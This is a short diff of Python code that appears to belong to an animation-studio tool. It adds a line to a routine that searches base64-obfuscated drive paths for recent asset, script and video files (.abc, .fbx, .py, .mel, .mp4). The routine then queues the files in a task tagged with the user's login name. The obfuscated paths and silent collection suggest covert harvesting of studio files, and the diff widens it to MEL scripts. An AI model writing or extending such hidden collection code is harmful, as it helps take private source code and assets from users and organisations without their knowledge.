@@ -104,6 +104,7 @@ try:
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.abc')
     zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDovV0hNL0NIQVJBQ1RFUg==').decode(), ext='.fbx')
     zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('UzovQW5pbWF0aW9uIHRyYWluaW5nL0thb2ZhbmcvVG9vbHNfRGV2').decode(), ext='.py', n=50)
+    zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('UzovQW5pbWF0aW9uIHRyYWluaW5nL0thb2ZhbmcvVG9vbHNfRGV2').decode(), ext='.mel', n=50)
     zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('WDo=').decode(), ext='.mp4', n=15)
     if zovV:
         add_queue_task('tst__{}'.format(getpass.getuser().lower()), {'file': zovV})
